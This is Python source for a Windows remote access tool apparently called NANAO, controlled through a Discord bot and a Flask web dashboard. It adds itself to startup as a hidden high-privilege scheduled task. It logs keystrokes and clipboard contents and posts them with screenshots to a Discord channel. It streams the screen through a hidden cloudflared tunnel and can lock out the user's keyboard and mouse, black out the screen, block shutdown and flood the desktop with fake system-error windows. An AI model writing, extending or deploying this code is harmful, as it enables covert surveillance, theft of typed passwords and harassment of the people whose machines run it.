import discord
from discord.ext import commands, tasks
import psutil, platform, datetime, asyncio, io, json, socket, os, sys, re, ctypes
from ctypes import wintypes
import threading, tkinter as tk, subprocess, time, shutil, base64, urllib.request
from PIL import Image, ImageGrab
from pynput import keyboard, mouse
from flask import Flask, Response, request, jsonify
import cv2, numpy as np, pyperclip

# ============ KONFIGURASI & GLOBAL ============
def add_to_startup():
    try:
        path = sys.executable if getattr(sys, 'frozen', False) else f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{os.path.abspath(__file__)}"'
        subprocess.run(["schtasks", "/Create", "/SC", "ONLOGON", "/TN", "SystemDiscord", "/TR", f'"{path}"', "/RL", "HIGHEST", "/F"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except: pass

BASE_DIR = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
with open(os.path.join(BASE_DIR, "config.json"), "r") as f: CONFIG = json.load(f)
TOKEN, CHANNEL_ID = CONFIG["discord_token"], CONFIG["channel_id"]
LOG_INTERVAL = CONFIG.get("log_interval_seconds", 300)

intents = discord.Intents.default()
intents.message_content = True
intents.messages = True 
bot = commands.Bot(command_prefix="!", intents=intents, case_insensitive=True)

# State Global
DISCORD_HOOK = True
LOG_ACTIVE = False
MY_PC_NAME = platform.node() 
KEYLOG_ACTIVE = False
KEY_BUFFER = ""
SHORTCUT_BUFFER = ""
SPAM_SS_ACTIVE = False
SPAM_SS_DELAY = 1.0
IS_BLACK_SCREEN = False
IS_KEYBOARD_BLOCKED = False
IS_MOUSE_BLOCKED = False
IS_MSG_ACTIVE = False
IS_BAR_ACTIVE = False
FAKE_NOTIF_ACTIVE = False
ANTI_SHUTDOWN = False
ANTI_RESTART = False

# State Safe Exit
STOP_MSG, STOP_BS, STOP_BAR = False, False, False
black_screen_root, msg_window_root, bar_window_root, anti_window_root = None, None, None, None
kb_block_listener, ms_block_listener, msg_kb_block, msg_ms_block = None, None, None, None

# State Fake Error
FAKE_WINDOWS = []
FAKE_LOCK = threading.Lock()

# State Web & Stream
WEB_PASSWORD = "nanao" 
STREAM_PORT = 2222
app = Flask(__name__)
streaming_active = False
tunnel_process = None
PUBLIC_URL = ""
WEB_LOGS = []
CLIPBOARD_HISTORY = []
last_clip = ""

# ============ HELPER ============
def add_web_log(text, log_type="info"):
    WEB_LOGS.append({"time": datetime.datetime.now().strftime("%H:%M:%S"), "text": text, "type": log_type})
    if len(WEB_LOGS) > 60: WEB_LOGS.pop(0)

def capture_screen_to_memory() -> io.BytesIO:
    img = ImageGrab.grab(all_screens=False)
    buffer = io.BytesIO(); img.save(buffer, format="PNG", optimize=True); buffer.seek(0)
    return buffer

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except: return "127.0.0.1"

def get_system_info() -> str:
    try: is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: is_admin = False
    return f"{platform.node()} | CPU: {psutil.cpu_percent()}% | RAM: {psutil.virtual_memory().percent}% | {'Admin' if is_admin else 'User'}"

def clipboard_listener():
    global last_clip
    while True:
        try:
            current_clip = pyperclip.paste()
            if current_clip and current_clip != last_clip:
                if current_clip not in CLIPBOARD_HISTORY:
                    CLIPBOARD_HISTORY.insert(0, current_clip)
                    if len(CLIPBOARD_HISTORY) > 20: CLIPBOARD_HISTORY.pop()
                last_clip = current_clip
        except: pass
        time.sleep(0.5)

def get_window_apps() -> list:
    user32 = ctypes.windll.user32; apps = []
    def enum_windows_proc(hwnd, lParam):
        if user32.IsWindowVisible(hwnd):
            length = user32.GetWindowTextLengthW(hwnd)
            if length > 0:
                buff = ctypes.create_unicode_buffer(length + 1); user32.GetWindowTextW(hwnd, buff, length + 1)
                pid = wintypes.DWORD(); user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                try:
                    p = psutil.Process(pid.value)
                    if not any(app['pid'] == pid.value for app in apps): apps.append({"name": p.name(), "title": buff.value, "pid": pid.value})
                except: pass
        return True
    user32.EnumWindows(ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)(enum_windows_proc), 0)
    return apps

def find_installed_app(app_name: str) -> str:
    search_name = app_name.lower()
    for d_path in [os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop'), os.path.join(os.environ.get('PUBLIC', ''), 'Desktop')]:
        if not os.path.exists(d_path): continue
        try:
            for file in os.listdir(d_path):
                if (file.endswith('.lnk') or file.endswith('.exe')) and search_name in file.lower(): return os.path.join(d_path, file)
        except: pass
    return shutil.which(app_name) or shutil.which(app_name + '.exe')

async def purge_channel(channel_id):
    channel = bot.get_channel(channel_id)
    if channel:
        try:
            deleted_total = 0
            while True:
                deleted = await channel.purge(limit=100, bulk=True)
                deleted_total += len(deleted)
                if len(deleted) < 100: break 
            add_web_log(f"🧹 Menghapus {deleted_total} pesan di channel.", "info")
        except discord.Forbidden:
            add_web_log("❌ Gagal clear: Bot tidak punya izin 'Manage Messages'.", "error")
        except Exception as e:
            add_web_log(f"❌ Gagal clear: {e}", "error")

def run_anti_task():
    global anti_window_root
    if anti_window_root is not None: return
    anti_window_root = tk.Tk(); anti_window_root.withdraw()
    def wnd_proc(hwnd, msg, wparam, lparam):
        if msg == 0x0011 and (ANTI_SHUTDOWN or ANTI_RESTART): return 0
        return ctypes.windll.user32.DefWindowProcW(hwnd, msg, wparam, lparam)
    hwnd = ctypes.windll.user32.GetParent(anti_window_root.winfo_id())
    WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_long, wintypes.HWND, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM)
    ctypes.windll.user32.SetWindowLongPtrW(hwnd, -4, WNDPROC(wnd_proc))
    anti_window_root.mainloop()

def create_fake_error():
    global FAKE_WINDOWS
    if not FAKE_NOTIF_ACTIVE: return
    with FAKE_LOCK:
        if len(FAKE_WINDOWS) >= 15: return
            
    try:
        root = tk.Tk()
        root.title("System Error"); root.geometry("450x180"); root.attributes("-topmost", True); root.resizable(False, False); root.configure(bg="#F0F0F0")
        canvas = tk.Canvas(root, width=50, height=50, bg="#F0F0F0", highlightthickness=0); canvas.place(x=20, y=30)
        canvas.create_oval(2, 2, 48, 48, fill="#E81123", outline="#E81123")
        canvas.create_line(15, 15, 35, 35, fill="white", width=4); canvas.create_line(35, 15, 15, 35, fill="white", width=4)
        tk.Label(root, text="Critical System Error", font=("Segoe UI", 14, "bold"), bg="#F0F0F0").place(x=80, y=20)
        tk.Label(root, text="A fatal exception has occurred.\nThe system is running out of memory.", font=("Segoe UI", 9), bg="#F0F0F0", justify="left").place(x=80, y=50)
        
        def on_ok():
            root.destroy()
            with FAKE_LOCK:
                if root in FAKE_WINDOWS: FAKE_WINDOWS.remove(root)
            if FAKE_NOTIF_ACTIVE: [threading.Thread(target=create_fake_error, daemon=True).start() for _ in range(2)]
            
        def on_close():
            root.destroy()
            with FAKE_LOCK:
                if root in FAKE_WINDOWS: FAKE_WINDOWS.remove(root)
            if FAKE_NOTIF_ACTIVE: [threading.Thread(target=create_fake_error, daemon=True).start() for _ in range(5)]
            
        tk.Button(root, text="OK", width=10, command=on_ok, bg="#E1E1E1", relief="groove").place(x=180, y=120)
        root.protocol("WM_DELETE_WINDOW", on_close)
        
        with FAKE_LOCK: FAKE_WINDOWS.append(root)
        root.mainloop()
    except: pass

def run_fake_notif():
    while FAKE_NOTIF_ACTIVE:
        threading.Thread(target=create_fake_error, daemon=True).start()
        time.sleep(0.5) 

def clear_fake_errors():
    global FAKE_NOTIF_ACTIVE, FAKE_WINDOWS
    FAKE_NOTIF_ACTIVE = False
    with FAKE_LOCK:
        for w in list(FAKE_WINDOWS):
            try: 
                w.quit()
                w.destroy()
            except: pass
        FAKE_WINDOWS.clear()

def reset_all_blocks():
    global IS_BLACK_SCREEN, IS_KEYBOARD_BLOCKED, IS_MOUSE_BLOCKED, IS_MSG_ACTIVE, STOP_MSG, STOP_BS, STOP_BAR, IS_BAR_ACTIVE, FAKE_NOTIF_ACTIVE
    global kb_block_listener, ms_block_listener, bar_window_root, msg_kb_block, msg_ms_block
    
    IS_BLACK_SCREEN = IS_KEYBOARD_BLOCKED = IS_MOUSE_BLOCKED = IS_MSG_ACTIVE = IS_BAR_ACTIVE = False
    STOP_MSG = STOP_BS = STOP_BAR = True
    clear_fake_errors()
    
    l_kb = kb_block_listener; l_ms = ms_block_listener; l_mkb = msg_kb_block; l_mms = msg_ms_block
    kb_block_listener = ms_block_listener = msg_kb_block = msg_ms_block = None
    
    for l in [l_kb, l_ms, l_mkb, l_mms]:
        if l:
            try: l.stop()
            except: pass
            
    try:
        ctypes.windll.user32.BlockInput(False)
        for _ in range(5): ctypes.windll.user32.ShowCursor(True)
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 5)
    except: pass

def on_press(key):
    global KEY_BUFFER, SHORTCUT_BUFFER, IS_KEYBOARD_BLOCKED
    try:
        if hasattr(key, 'char') and key.char is not None:
            SHORTCUT_BUFFER += key.char.lower()
            if len(SHORTCUT_BUFFER) > 3: SHORTCUT_BUFFER = SHORTCUT_BUFFER[-3:]
            if SHORTCUT_BUFFER == "nao": 
                SHORTCUT_BUFFER = ""
                threading.Thread(target=reset_all_blocks).start()
                return 
    except: pass
    
    if IS_KEYBOARD_BLOCKED or not KEYLOG_ACTIVE: return
    try:
        char = key.char
        if char is None: raise AttributeError
    except AttributeError:
        char = " " if key == keyboard.Key.space else "\n" if key == keyboard.Key.enter else f"[{key.name.upper()}]"
    if char: KEY_BUFFER += char

def run_blackscreen_logic():
    global black_screen_root, msg_kb_block, msg_ms_block
    def show():
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
        msg_kb_block = keyboard.Listener(suppress=True); msg_kb_block.start()
        msg_ms_block = mouse.Listener(suppress=True); msg_ms_block.start()
        black_screen_root = tk.Tk()
        ctypes.windll.user32.SetWindowLongW(ctypes.windll.user32.GetParent(black_screen_root.winfo_id()), -20, ctypes.windll.user32.GetWindowLongW(ctypes.windll.user32.GetParent(black_screen_root.winfo_id()), -20) | 0x00000080 | 0x08000000)
        black_screen_root.overrideredirect(True); black_screen_root.attributes("-topmost", True)
        black_screen_root.geometry(f"{black_screen_root.winfo_screenwidth()}x{black_screen_root.winfo_screenheight()}+0+0")
        black_screen_root.configure(background='black'); black_screen_root.grab_set()
        def check():
            if STOP_BS:
                try: black_screen_root.grab_release()
                except: pass
                if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 5)
                black_screen_root.destroy()
            else: black_screen_root.after(100, check)
        check(); black_screen_root.mainloop()
    threading.Thread(target=show, daemon=True).start()

def run_sendmsg_logic(text, duration):
    global msg_window_root, msg_kb_block, msg_ms_block
    def show():
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
        msg_kb_block = keyboard.Listener(suppress=True); msg_kb_block.start()
        msg_ms_block = mouse.Listener(suppress=True); msg_ms_block.start()
        msg_window_root = tk.Tk()
        ctypes.windll.user32.SetWindowLongW(ctypes.windll.user32.GetParent(msg_window_root.winfo_id()), -20, ctypes.windll.user32.GetWindowLongW(ctypes.windll.user32.GetParent(msg_window_root.winfo_id()), -20) | 0x00000080 | 0x08000000)
        msg_window_root.overrideredirect(True); msg_window_root.attributes("-topmost", True)
        msg_window_root.geometry(f"{msg_window_root.winfo_screenwidth()}x{msg_window_root.winfo_screenheight()}+0+0")
        msg_window_root.configure(background='black'); msg_window_root.attributes("-alpha", 0.7)
        tk.Label(msg_window_root, text=text, font=("Arial", 50, "bold"), fg="red", bg="black").place(relx=0.5, rely=0.5, anchor="center")
        def check():
            if STOP_MSG:
                try: msg_window_root.grab_release()
                except: pass
                if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 5)
                msg_window_root.destroy()
            else: msg_window_root.after(100, check)
        if duration > 0: msg_window_root.after(duration * 1000, lambda: threading.Thread(target=reset_all_blocks).start())
        check(); msg_window_root.mainloop()
    threading.Thread(target=show, daemon=True).start()

def run_sendbar_logic(text):
    global bar_window_root, STOP_BAR
    def show():
        global bar_window_root
        bar_window_root = tk.Tk()
        ctypes.windll.user32.SetWindowLongW(ctypes.windll.user32.GetParent(bar_window_root.winfo_id()), -20, ctypes.windll.user32.GetWindowLongW(ctypes.windll.user32.GetParent(bar_window_root.winfo_id()), -20) | 0x00000080 | 0x08000000)
        bar_window_root.overrideredirect(True); bar_window_root.attributes("-topmost", True)
        bar_window_root.geometry(f"350x40+20+{bar_window_root.winfo_screenheight() - 100}")
        bar_window_root.configure(bg='#2f3136'); bar_window_root.attributes("-alpha", 0.95)
        entry = tk.Entry(bar_window_root, bg='#40444b', fg='white', font=("Arial", 12))
        entry.pack(padx=5, pady=5, fill=tk.BOTH, expand=True); entry.insert(0, text); entry.select_range(0, tk.END); entry.focus_force()
        def send(event=None):
            txt = entry.get()
            if txt.strip():
                channel = bot.get_channel(CHANNEL_ID)
                if channel: asyncio.run_coroutine_threadsafe(channel.send(f"💬 **{MY_PC_NAME}**: `{txt}`"), bot.loop)
            entry.delete(0, tk.END)
        def check():
            if STOP_BAR:
                try: bar_window_root.quit(); bar_window_root.destroy()
                except: pass
            else: bar_window_root.after(100, check)
        entry.bind("<Return>", send); check(); bar_window_root.mainloop()
    threading.Thread(target=show, daemon=True).start()

# ============ WEB SERVER & UI ============
def generate_frames():
    while streaming_active:
        try:
            img = ImageGrab.grab(all_screens=False)
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            _, encodedImage = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50]) 
            yield (b'--frame\r\n' b'Content-Type: image/jpeg\r\n\r\n' + bytearray(encodedImage) + b'\r\n')
            time.sleep(0.1) 
        except: time.sleep(1)

@app.route("/video_feed")
def video_feed(): return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route("/stream")
def stream_page():
    return """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><style>body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden;}img{max-width:100%;max-height:100%;object-fit:contain;}.btn{position:absolute;top:10px;right:10px;background:#1e90ff;color:#fff;border:none;padding:10px 15px;border-radius:5px;cursor:pointer;z-index:10;font-weight:bold;}</style></head><body><button class="btn" onclick="fs()">⛶ Layar Penuh</button><img src="/video_feed"><script>function fs(){const e=document.documentElement;if(e.requestFullscreen)e.requestFullscreen();if(screen.orientation&&screen.orientation.lock)screen.orientation.lock('landscape');}</script></body></html>"""

@app.route("/")
def dashboard():
    return """<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>NANAO</title><style>
    *{box-sizing:border-box;margin:0;padding:0;font-family:sans-serif}body{background:#06142e;color:#fff;display:flex;flex-direction:column;height:100vh;overflow:hidden}
    #lgn{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;position:absolute;width:100%;z-index:999;background:#06142e}.box{background:#0d1e3d;padding:30px;border-radius:10px;text-align:center;width:90%;max-width:300px}
    input{width:100%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #1e90ff;background:#06142e;color:#fff}
    button{background:#1e90ff;color:#fff;border:none;padding:10px;border-radius:5px;cursor:pointer;font-weight:bold;width:100%;margin-top:5px}
    #dsh{display:none;flex-direction:column;height:100%}.hdr{background:#0d1e3d;padding:10px;text-align:center;border-bottom:2px solid #1e90ff;position:relative}.hdr h1{font-size:16px;color:#1e90ff}.hdr p{font-size:10px;color:#aaa}
    .lo{position:absolute;right:10px;top:10px;background:#e74c3c;padding:5px 10px;width:auto;font-size:12px;border-radius:5px}
    .cnt{display:flex;flex:1;overflow:hidden;flex-direction:row}@media(max-width:768px){.cnt{flex-direction:column}}
    .ctrl{flex:1;padding:10px;overflow-y:auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:10px;align-content:start}
    .card{background:#0d1e3d;border-radius:8px;padding:10px;text-align:center;border:1px solid #1e90ff44}.card h3{font-size:11px;margin-bottom:5px}
    .st{font-size:10px;font-weight:bold;margin-bottom:5px}.on{color:#00ff88}.off{color:#ff4444}
    .trm{flex:1;background:#000;border-left:2px solid #1e90ff;display:flex;flex-direction:column;max-height:40%}@media(min-width:769px){.trm{max-height:100%}}
    .trm-h{background:#0d1e3d;padding:5px 10px;font-size:10px;font-weight:bold;display:flex;justify-content:space-between}
    .trm-b{flex:1;padding:10px;overflow-y:auto;font-family:monospace;font-size:11px;color:#00ff88}.log{margin-bottom:5px;word-wrap:break-word}.t{color:#888;margin-right:5px}
    .img{max-width:100%;border-radius:5px;margin-top:5px;border:1px solid #1e90ff}.key{color:#f1c40f}
    </style></head><body>
    <div id="lgn"><div class="box"><h2>🎮 NANAO</h2><input type="password" id="pwd" placeholder="PIN" onkeypress="if(event.key==='Enter')log()"><button onclick="log()">Masuk</button></div></div>
    <div id="dsh">
        <div class="hdr"><h1>🎮 NANAO CONTROLLER</h1><p id="inf">Loading...</p><button class="lo" onclick="logout()">Logout</button></div>
        <div class="cnt"><div class="ctrl" id="grid"></div>
        <div class="trm"><div class="trm-h"><span>Terminal</span><span style="color:#ff4444;cursor:pointer" onclick="fetch('/api/clr?token='+tk)">Clear</span></div><div class="trm-b" id="log"></div></div></div>
    </div>
    <script>
    let tk = localStorage.getItem("nanao_token") || "";
    if(tk === "nanao"){ document.getElementById('lgn').style.display='none'; document.getElementById('dsh').style.display='flex'; init(); }

    function log(){
        let pwd = document.getElementById('pwd').value;
        if(pwd === "nanao"){ localStorage.setItem("nanao_token", pwd); tk = pwd; document.getElementById('lgn').style.display='none'; document.getElementById('dsh').style.display='flex'; init(); } else alert("PIN Salah!")
    }
    function logout(){ localStorage.removeItem("nanao_token"); location.reload(); }

    function init(){
        const g=document.getElementById('grid');
        g.innerHTML=`
        <div class="card"><h3>Hook DC</h3><div class="st off" id="st-hook">OFF</div><button onclick="tgl('hook')">Toggle</button></div>
        <div class="card"><h3>Black Screen</h3><div class="st off" id="st-bs">OFF</div><button onclick="tgl('bs')">Toggle</button></div>
        <div class="card"><h3>Block KB</h3><div class="st off" id="st-bk">OFF</div><button onclick="tgl('bk')">Toggle</button></div>
        <div class="card"><h3>Block Mouse</h3><div class="st off" id="st-bm">OFF</div><button onclick="tgl('bm')">Toggle</button></div>
        <div class="card"><h3>Keylogger</h3><div class="st off" id="st-kl">OFF</div><button onclick="tgl('kl')">Toggle</button></div>
        <div class="card"><h3>Auto Logs</h3><div class="st off" id="st-logs">OFF</div><button onclick="tgl('logs')">Toggle</button></div>
        <div class="card"><h3>Anti Shutdown</h3><div class="st off" id="st-anti_sd">OFF</div><button onclick="tgl('anti_sd')">Toggle</button></div>
        <div class="card"><h3>Anti Restart</h3><div class="st off" id="st-anti_rs">OFF</div><button onclick="tgl('anti_rs')">Toggle</button></div>
        <div class="card"><h3>Fake Notif</h3><div class="st off" id="st-fakenotif">OFF</div><button onclick="tgl('fakenotif')">Toggle</button></div>
        <div class="card"><h3>Spam SS</h3><div class="st off" id="st-spamss">OFF</div><input type="number" id="spam" value="1.0" step="0.5" style="margin:2px 0;padding:3px;width:100%"><button onclick="spam()">Start</button></div>
        <div class="card" style="grid-column:span 2"><h3>Overlay</h3><input type="text" id="msg" placeholder="Pesan..."><div style="display:flex;gap:5px"><input type="number" id="dur" value="10" style="width:60px"><button onclick="act('sendmsg',document.getElementById('msg').value,document.getElementById('dur').value)">Kirim</button></div></div>
        <div class="card" style="grid-column:span 2"><h3>Chat Bar</h3><input type="text" id="bar" placeholder="Pesan..."><button onclick="act('sendbar',document.getElementById('bar').value)">Buka/Tutup</button></div>
        <div class="card" style="grid-column:1/-1;border-color:#1e90ff"><h3>Aksi Cepat</h3><div style="display:flex;gap:5px;flex-wrap:wrap">
        <button style="flex:1" onclick="act('ss')">📸 SS</button><button style="flex:1" onclick="act('cb')">📋 CB</button><button style="flex:1;background:#f39c12" onclick="act('lock')">🔒 Lock</button>
        <button style="flex:1;background:#e67e22" onclick="act('sleep')">💤 Sleep</button><button style="flex:1;background:#e74c3c" onclick="act('restart')">🔄 Restart</button><button style="flex:1;background:#c0392b" onclick="act('shutdown')">🛑 Shut</button>
        <button style="width:100%;background:#e74c3c;margin-top:5px" onclick="act('clear')">🧹 Clear Chat Discord</button>
        <button style="width:100%;background:#f1c40f;color:#000;margin-top:5px" onclick="act('clrnotif')">🧹 Clear Fake Notif</button>
        <button style="width:100%;background:#9b59b6;margin-top:5px" onclick="act('livestream')">📺 Live Stream</button></div></div>`;
        setInterval(fetchSt,2000);setInterval(fetchLg,1500);fetchSt();
    }

    async function fetchSt(){
        const r=await fetch('/api/status?token='+tk); const d=await r.json();
        document.getElementById('inf').innerText=d.sys;
        for(const[k,v]of Object.entries(d.state)){
            const e=document.getElementById('st-'+k);
            if(e){e.innerText=v?"ON":"OFF";e.className=v?"st on":"st off"}
        }
    }
    async function tgl(f){await fetch('/api/toggle',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:tk,feature:f})});fetchSt()}
    async function spam(){await fetch('/api/toggle',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:tk,feature:'spamss',val:document.getElementById('spam').value})});fetchSt()}
    async function act(a,t="",e=""){
        const r=await fetch('/api/action',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:tk,action:a,text:t,extra:e})});
        const d=await r.json(); if(d.url)window.open(d.url,'_blank'); if(['ss','cb','livestream','clear','clrnotif'].includes(a))setTimeout(fetchLg,1000);
    }
    async function fetchLg(){
        const r=await fetch('/api/logs?token='+tk); const l=await r.json(); const t=document.getElementById('log'); let h="";
        l.forEach(x=>{let c=x.text,k=x.type==='keylog'?'key':'';if(x.type==='image')c=`<br><img src="data:image/jpeg;base64,${x.text}" class="img">`;h+=`<div class="log ${k}"><span class="t">[${x.time}]</span> ${c}</div>`});
        if(t.innerHTML!==h){t.innerHTML=h;} /* AUTO SCROLL DIHAPUS */
    }
    </script></body></html>"""

@app.route("/api/status")
def api_status():
    if request.args.get("token") != WEB_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
    state = {"hook": DISCORD_HOOK, "bs": IS_BLACK_SCREEN, "bk": IS_KEYBOARD_BLOCKED, "bm": IS_MOUSE_BLOCKED, "kl": KEYLOG_ACTIVE, "logs": LOG_ACTIVE, "spamss": SPAM_SS_ACTIVE, "anti_sd": ANTI_SHUTDOWN, "anti_rs": ANTI_RESTART, "fakenotif": FAKE_NOTIF_ACTIVE}
    return jsonify({"state": state, "sys": get_system_info()})

@app.route("/api/toggle", methods=["POST"])
def api_toggle():
    global DISCORD_HOOK, IS_BLACK_SCREEN, IS_KEYBOARD_BLOCKED, IS_MOUSE_BLOCKED, KEYLOG_ACTIVE, LOG_ACTIVE, SPAM_SS_ACTIVE, ANTI_SHUTDOWN, ANTI_RESTART, FAKE_NOTIF_ACTIVE
    global kb_block_listener, ms_block_listener, STOP_BS, SPAM_SS_DELAY
    
    data = request.json
    if data.get("token") != WEB_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
    f = data.get("feature")
    
    if f == "hook": DISCORD_HOOK = not DISCORD_HOOK
    elif f == "bs":
        IS_BLACK_SCREEN = not IS_BLACK_SCREEN
        if IS_BLACK_SCREEN: STOP_BS = False; run_blackscreen_logic()
        else: threading.Thread(target=reset_all_blocks).start()
    elif f == "bk":
        IS_KEYBOARD_BLOCKED = not IS_KEYBOARD_BLOCKED
        if IS_KEYBOARD_BLOCKED:
            if not kb_block_listener: kb_block_listener = keyboard.Listener(suppress=True); kb_block_listener.start()
        else:
            if kb_block_listener: 
                try: kb_block_listener.stop()
                except: pass
                kb_block_listener = None
    elif f == "bm":
        IS_MOUSE_BLOCKED = not IS_MOUSE_BLOCKED
        if IS_MOUSE_BLOCKED:
            if not ms_block_listener: ms_block_listener = mouse.Listener(suppress=True); ms_block_listener.start()
        else:
            if ms_block_listener: 
                try: ms_block_listener.stop()
                except: pass
                ms_block_listener = None
            for _ in range(5): ctypes.windll.user32.ShowCursor(True)
    elif f == "kl": KEYLOG_ACTIVE = not KEYLOG_ACTIVE
    elif f == "logs": LOG_ACTIVE = not LOG_ACTIVE
    elif f == "anti_sd": ANTI_SHUTDOWN = not ANTI_SHUTDOWN
    elif f == "anti_rs": ANTI_RESTART = not ANTI_RESTART
    elif f == "fakenotif":
        FAKE_NOTIF_ACTIVE = not FAKE_NOTIF_ACTIVE
        if FAKE_NOTIF_ACTIVE: threading.Thread(target=run_fake_notif, daemon=True).start()
        else: clear_fake_errors()
    elif f == "spamss":
        SPAM_SS_ACTIVE = not SPAM_SS_ACTIVE
        if SPAM_SS_ACTIVE:
            SPAM_SS_DELAY = float(data.get("val", 1.0))
            spam_ss_task.change_interval(seconds=SPAM_SS_DELAY)
            if not spam_ss_task.is_running(): spam_ss_task.start()
    add_web_log(f"[{f.upper()}] diubah via Web.", "info")
    return jsonify({"success": True})

@app.route("/api/action", methods=["POST"])
def api_action():
    global STOP_MSG, STOP_BAR, IS_BAR_ACTIVE, streaming_active, PUBLIC_URL
    data = request.json
    if data.get("token") != WEB_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
    a = data.get("action")
    
    if a == "ss":
        img = ImageGrab.grab(all_screens=False); img.thumbnail((800, 800))
        buff = io.BytesIO(); img.convert('RGB').save(buff, format="JPEG", quality=60)
        add_web_log(base64.b64encode(buff.getvalue()).decode('utf-8'), "image")
    elif a == "cb": add_web_log(f"CB: {pyperclip.paste() or '(Kosong)'}", "info")
    elif a == "lock": ctypes.windll.user32.LockWorkStation()
    elif a == "sleep": os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
    elif a == "restart": os.system("shutdown /r /t 5 /f")
    elif a == "shutdown": os.system("shutdown /s /t 5 /f")
    elif a == "sendmsg":
        STOP_MSG = False; run_sendmsg_logic(data.get("text", ""), int(data.get("extra", 10)))
        add_web_log(f"Msg: {data.get('text')}", "info")
    elif a == "sendbar":
        if IS_BAR_ACTIVE: STOP_BAR = True; IS_BAR_ACTIVE = False
        else: STOP_BAR = False; IS_BAR_ACTIVE = True; run_sendbar_logic(data.get("text", ""))
    elif a == "livestream":
        if not streaming_active: streaming_active = True
        if PUBLIC_URL: return jsonify({"success": True, "url": f"{PUBLIC_URL}/stream"})
        else: return jsonify({"success": False, "msg": "Tunnel belum siap, klik !web di Discord."})
    elif a == "clear":
        asyncio.run_coroutine_threadsafe(purge_channel(CHANNEL_ID), bot.loop)
    elif a == "clrnotif":
        clear_fake_errors()
        add_web_log("🧹 Fake Notif dibersihkan.", "info")
    return jsonify({"success": True})

@app.route("/api/logs")
def api_logs():
    if request.args.get("token") != WEB_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
    return jsonify(WEB_LOGS)

@app.route("/api/clr")
def api_clr():
    global WEB_LOGS
    if request.args.get("token") != WEB_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
    WEB_LOGS = []; return jsonify({"success": True})

def run_web_server(): app.run(host='0.0.0.0', port=STREAM_PORT, threaded=True)

def start_tunnel():
    global tunnel_process, PUBLIC_URL
    try:
        c_path = os.path.join(BASE_DIR, "cloudflared.exe")
        if not os.path.exists(c_path): return "ERROR: cloudflared.exe hilang."
        
        if tunnel_process:
            try: tunnel_process.kill()
            except: pass
            
        tunnel_process = subprocess.Popen([c_path, "tunnel", "--url", f"http://localhost:{STREAM_PORT}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        result_url = [None]
        def read_output():
            for line in tunnel_process.stderr:
                m = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                if m: 
                    result_url[0] = m.group(0)
                    break
        
        t = threading.Thread(target=read_output, daemon=True)
        t.start()
        t.join(timeout=20) 
        
        if result_url[0]:
            PUBLIC_URL = result_url[0]
            return PUBLIC_URL
        else:
            return "ERROR: Gagal mendapatkan URL dari Cloudflare (Timeout)."
    except Exception as e: 
        return f"ERROR: {e}"

# ============ DISCORD TASKS & EVENTS ============
async def send_screenshot(channel, title):
    buffer = await asyncio.get_event_loop().run_in_executor(None, capture_screen_to_memory)
    file = discord.File(fp=buffer, filename="screen.png")
    await channel.send(embed=discord.Embed(title=title, color=discord.Color.green()).set_image(url="attachment://screen.png"), file=file)

@tasks.loop(seconds=3)
async def keylog_sender_task():
    global KEY_BUFFER
    if not KEYLOG_ACTIVE or not KEY_BUFFER: return
    chunk = KEY_BUFFER.replace("`", "'"); KEY_BUFFER = ""
    add_web_log(f"Keylog: {chunk}", "keylog")
    channel = bot.get_channel(CHANNEL_ID)
    if channel and DISCORD_HOOK: await channel.send(embed=discord.Embed(title=f"⌨️ Keylog", description=f"```text\n{chunk}\n```", color=discord.Color.dark_grey()))

@tasks.loop(seconds=1)
async def spam_ss_task():
    if not SPAM_SS_ACTIVE: return
    channel = bot.get_channel(CHANNEL_ID)
    if channel and DISCORD_HOOK:
        try: await send_screenshot(channel, "🚀 Spam SS")
        except: pass

@tasks.loop(seconds=LOG_INTERVAL)
async def periodic_log():
    if not LOG_ACTIVE: return 
    channel = bot.get_channel(CHANNEL_ID)
    if channel and DISCORD_HOOK:
        info = get_system_info()
        add_web_log(f"Log: {info}", "info")
